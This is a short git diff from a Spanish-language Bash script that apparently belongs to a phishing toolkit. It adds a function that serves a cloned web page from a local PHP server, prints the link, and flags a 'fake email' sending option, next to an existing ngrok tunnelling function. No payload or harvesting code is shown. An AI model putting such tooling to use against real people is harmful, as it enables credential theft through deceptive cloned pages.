@@ -116,4 +116,29 @@ ngrok(){
         check
         check_found
 	fi
-} 
+}
+
+
+localhost(){
+
+if [[ $clonada == "si" ]];then
+		descargar_pagina
+	fi
+        echo -e "$v[$b*$v]$b Iniciando servidor php..."
+        php -S localhost:3333 > /dev/null 2>&1 &
+        cd $OLDPWD
+
+        echo -e "$v[$b*$v]$b Tu enlace: \e[0;32mhttp://localhost:3333"
+        cd $ruta_carpeta
+
+
+        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
+        if [[ $add7 == "7" ]];then
+                echo -e "$v[$b*$v]$b Enviando email..."
+        fi
+        check
+        check_found
+
+}
+
+
